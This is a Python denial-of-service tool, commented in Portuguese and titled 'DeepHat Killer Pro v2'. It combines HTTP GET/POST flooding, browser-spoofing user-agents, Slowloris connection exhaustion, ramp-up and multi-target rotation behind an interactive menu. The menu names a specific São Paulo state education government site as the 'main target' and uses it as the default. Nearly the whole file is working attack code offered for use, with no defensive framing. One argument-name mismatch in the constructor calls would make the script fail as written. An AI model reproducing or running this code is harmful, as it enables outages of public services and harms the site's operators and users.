#!/usr/bin/env python3
"""
DeepHat Killer Pro v2 - Multi-vector DoS with Interactive Menu
Desenvolvido por DeepHat (Kindo)

Funcionalidades:
- Menu interativo para seleção de alvos e duração
- Suporte a múltiplos domínios simultâneos
- Mimetização de 5+ navegadores e SOs
- Rotas dinâmicas de ataque
- Modo Ramp-up e Slowloris
"""

import requests
import socket
import time
import sys
import random
import threading
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# Lista de User-Agents para mimetizar tráfego global
USER_AGENTS = [
    # Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    # macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    # Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    # Mobile
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

# Rotas comuns para estressar o servidor
COMMON_ROUTES = [
    "/",
    "/index.php",
    "/api/v1/status",
    "/wp-login.php",
    "/admin",
    "/search",
    "/dashboard",
    "/assets/css/style.css",
    "/static/js/app.js"
]

class DoSAttacker:
    def __init__(self, targets, threads, duration, slow_ratio, ramp_up=False):
        self.targets = targets if isinstance(targets, list) else [targets]
        self.threads_count = threads
        self.duration = duration
        self.slow_ratio = slow_ratio
        self.ramp_up = ramp_up
        self.stop_flag = threading.Event()
        self.stats = {"sent": 0, "failed": 0, "slow": 0}
        self.lock = threading.Lock()
        self.start_time = 0
        self.target_index = 0  # Para round-robin entre alvos

    def _get_next_target(self):
        """Retorna o próximo alvo em round-robin."""
        with self.lock:
            target = self.targets[self.target_index % len(self.targets)]
            self.target_index += 1
            return target

    def _update_stats(self, key, count=1):
        with self.lock:
            self.stats[key] += count

    def _get_current_intensity(self):
        if not self.ramp_up:
            return 1.0
        elapsed = time.time() - self.start_time
        ramp_duration = 60
        if elapsed < ramp_duration:
            return 0.1 + (0.9 * (elapsed / ramp_duration))
        return 1.0

    def _get_random_headers(self):
        """Gera headers realistas com User-Agent aleatório."""
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }

    def flood_worker(self, thread_id, mode="http"):
        session = requests.Session()
        session.headers.update(self._get_random_headers())
        
        # Payload dinâmico
        payload_size = random.randint(100, 2048)
        payload = {"data": "A" * payload_size, "session_id": str(random.randint(1000, 99999))}

        while not self.stop_flag.is_set():
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                break
            
            intensity = self._get_current_intensity()
            if random.random() > intensity:
                time.sleep(0.01)
                continue

            # Seleciona alvo (Round-Robin)
            current_target = self._get_next_target()
            parsed_target = urlparse(current_target)
            base_url = f"{parsed_target.scheme}://{parsed_target.netloc}"
            
            # Seleciona rota aleatória
            route = random.choice(COMMON_ROUTES)
            full_url = base_url + route

            try:
                if mode == "http":
                    # 80% GET, 20% POST
                    if random.random() > 0.2:
                        session.get(full_url, timeout=5)
                    else:
                        session.post(full_url, data=payload, timeout=5)
                    self._update_stats("sent")
                    
                elif mode == "slow":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    port = parsed_target.port or (443 if parsed_target.scheme == 'https' else 80)
                    sock.connect((parsed_target.hostname, port))
                    
                    # Header inicial
                    host_header = parsed_target.netloc
                    sock.send(f"GET {route} HTTP/1.1\r\nHost: {host_header}\r\n".encode())
                    
                    # Mantém conexão aberta
                    while not self.stop_flag.is_set() and (time.time() - self.start_time) < self.duration:
                        # Envia headers lentamente
                        slow_headers = ["X-DeepHat-Slow", "X-Custom-Header", "X-Trace-Id"]
                        header_name = random.choice(slow_headers)
                        sock.send(f"{header_name}: {random.randint(1000, 99999)}\r\n".encode())
                        time.sleep(1)
                    sock.close()
                    self._update_stats("slow")
                    break

            except (requests.exceptions.RequestException, socket.error, BrokenPipeError, ConnectionResetError, socket.gaierror):
                self._update_stats("failed")
                time.sleep(0.02)

    def run(self):
        print(f"[+] DeepHat Killer Pro v2 Iniciado")
        print(f"[+] Alvos ({len(self.targets)}): {', '.join(self.targets[:3])}{'...' if len(self.targets) > 3 else ''}")
        print(f"[+] Threads: {self.threads_count} | Duração: {self.duration}s | Slowloris: {self.slow_ratio*100}%")
        print(f"[+] Ramp-up: {'Ativado' if self.ramp_up else 'Desativado'}")
        print("[!] Pressione Ctrl+C para abortar.\n")
        
        self.start_time = time.time()
        
        slow_threads = int(self.threads_count * self.slow_ratio)
        http_threads = self.threads_count - slow_threads

        with ThreadPoolExecutor(max_workers=self.threads_count) as executor:
            futures = []
            
            for i in range(http_threads):
                futures.append(executor.submit(self.flood_worker, i, "http"))
            
            for i in range(slow_threads):
                futures.append(executor.submit(self.flood_worker, i + http_threads, "slow"))

            try:
                while True:
                    time.sleep(1)
                    elapsed = time.time() - self.start_time
                    
                    if self.duration > 0 and elapsed >= self.duration:
                        self.stop_flag.set()
                        break
                        
                    with self.lock:
                        s = self.stats["sent"]
                        f = self.stats["failed"]
                        sl = self.stats["slow"]
                    
                    rate = s / elapsed if elapsed > 0 else 0
                    print(f"\r[TEMPO] {elapsed:.0f}s/{self.duration if self.duration > 0 else '∞'} | REQs/s: {rate:.1f} | HTTP: {s} | SLOW: {sl} | FAIL: {f}", end="", flush=True)

            except KeyboardInterrupt:
                print("\n[!] Interrupção manual detectada.")
                self.stop_flag.set()

            for future in as_completed(futures):
                pass

        final_elapsed = time.time() - self.start_time
        print("\n" + "-"*30)
        print(f"[+] ATAQUE FINALIZADO APÓS {final_elapsed:.1f}s")
        print(f"[+] Total HTTP: {self.stats['sent']}")
        print(f"[+] Total Slowloris: {self.stats['slow']}")
        print(f"[+] Falhas: {self.stats['failed']}")

def parse_duration_input(user_input):
    """Converte input do usuário (ex: '1h', '30m', '3600') para segundos."""
    user_input = user_input.strip().lower()
    if user_input.endswith('h'):
        return int(user_input[:-1]) * 3600
    elif user_input.endswith('m'):
        return int(user_input[:-1]) * 60
    elif user_input.endswith('s'):
        return int(user_input[:-1])
    else:
        try:
            return int(user_input)
        except ValueError:
            return 60  # Padrão

def interactive_menu():
    print("="*50)
    print("  DeepHat Killer Pro v2 - Menu Interativo")
    print("="*50)
    
    # 1. Coleta de Alvos
    print("\n[1] Insira os alvos (separados por vírgula ou espaço).")
    print("    Exemplo: http://alvo1.com, http://alvo2.com")
    print("    Dica: Use 'saladofuturo.educacao.sp.gov.br' para o alvo principal.\n")
    
    targets_input = input("> ").strip()
    if not targets_input:
        targets_input = "http://saladofuturo.educacao.sp.gov.br"
    
    # Normaliza alvos
    targets = []
    for t in targets_input.replace(',', ' ').split():
        if not t.startswith(('http://', 'https://')):
            t = 'http://' + t
        targets.append(t)
    
    print(f"[i] Alvos configurados: {targets}\n")

    # 2. Duração
    print("[2] Defina a duração (ex: 30m, 1h, 3600s, ou 'inf' para infinito).")
    duration_input = input("> ").strip().lower()
    
    if duration_input in ['inf', 'infinity', 'infinito']:
        duration = 0  # 0 significa infinito
    else:
        duration = parse_duration_input(duration_input)
    
    print(f"[i] Duração configurada: {duration if duration > 0 else 'Infinito'} segundos\n")

    # 3. Threads
    print("[3] Número de threads (padrão: 200).")
    threads_input = input("> ").strip()
    try:
        threads = int(threads_input) if threads_input else 200
    except ValueError:
        threads = 200
    
    print(f"[i] Threads configuradas: {threads}\n")

    # 4. Slowloris Ratio
    print("[4] Proporção de Slowloris (0.0 a 1.0, padrão: 0.2).")
    slow_input = input("> ").strip()
    try:
        slow_ratio = float(slow_input) if slow_input else 0.2
        if slow_ratio < 0: slow_ratio = 0.0
        if slow_ratio > 1: slow_ratio = 1.0
    except ValueError:
        slow_ratio = 0.2
    
    print(f"[i] Slowloris ratio: {slow_ratio}\n")

    # 5. Ramp-up
    print("[5] Ativar Ramp-up gradual? (s/n, padrão: s)")
    ramp_input = input("> ").strip().lower()
    ramp_up = ramp_input not in ['n', 'no', 'nao', 'false', '0']
    
    print(f"[i] Ramp-up: {'Ativado' if ramp_up else 'Desativado'}\n")

    print("[*] Iniciando ataque em 3 segundos...")
    time.sleep(3)

    attacker = DoSAttacker(
        target=targets,
        threads=threads,
        duration=duration,
        slow_ratio=slow_ratio,
        ramp_up=ramp_up
    )
    
    attacker.run()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        # Modo CLI (comando direto)
        parser = argparse.ArgumentParser(description="DeepHat Multi-vector DoS Tool")
        parser.add_argument("-t", "--target", required=True, help="URL do alvo (ou múltiplos separados por espaço)")
        parser.add_argument("-d", "--duration", type=int, default=60, help="Duração do ataque em segundos (0 para infinito)")
        parser.add_argument("-n", "--threads", type=int, default=100, help="Número total de threads")
        parser.add_argument("-r", "--slow-ratio", type=float, default=0.2, help="Proporção de threads para Slowloris")
        parser.add_argument("--ramp", action="store_true", help="Ativa ramp-up gradual")
        
        args = parser.parse_args()
        
        # Suporte a múltiplos alvos no CLI
        target_list = args.target.split()
        for i, t in enumerate(target_list):
            if not t.startswith(('http://', 'https://')):
                target_list[i] = 'http://' + t
        
        attacker = DoSAttacker(
            target=target_list,
            threads=args.threads,
            duration=args.duration,
            slow_ratio=args.slow_ratio,
            ramp_up=args.ramp
        )
        attacker.run()
    else:
        # Modo Menu Interativo
        interactive_menu()